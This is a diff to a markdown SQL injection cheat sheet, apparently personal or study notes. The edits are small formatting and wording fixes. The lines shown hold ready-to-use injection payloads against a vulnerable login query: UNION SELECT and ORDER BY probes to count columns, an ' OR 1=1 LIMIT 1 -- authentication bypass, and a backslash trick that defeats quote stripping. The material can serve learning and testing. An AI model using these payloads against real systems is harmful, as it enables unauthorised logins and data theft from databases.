@@ -1,9 +1,9 @@
-###### In the following queries, `'` may not work sometimes, so { __\`__,`"` } can  be tested
+###### In the following queries, `'` may not work sometimes, so { **\`**,`"` } can  be tested
 ###### To comment out the remaining code, { `;#`,`;--`,`;//` } can be used
 ###### While doing sqli through urls, { `;#`,`;--`,`;//` } need to be encoded specially 
 
-### Finding no of columns in table
-  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND 'pass=$input_pass'`
+### Finding no of columns in table _(Error-based SQLI)_
+  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
   
 * _[$input_user]_ : `' UNION SELECT 1,2,3.. FROM table_name --`
 * _[$input_user]_ : `' ORDER BY n --`  [If we get error for n, then n-1 will be no of columns]
@@ -14,7 +14,7 @@
 * _[$input_user]_ : `' OR 1=1 LIMIT 1 --`
 
 ### Special Bypassing
-* Bypass filtered `'`__[quote]__
+* Bypassing filtered `'`__[quote]__
 
 ```   
  <?php 
@@ -22,7 +22,7 @@
  $pass = preg_replace("'","",$pass);
  SELECT * FROM users WHERE username='name' and password='pass'
 ```
-  [attack] => user = `\`  & pass = `OR 1=1 --`
+  _[attack]_ => user = `\`  & pass = `OR 1=1 --`
 
 ## For Mysql
   _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
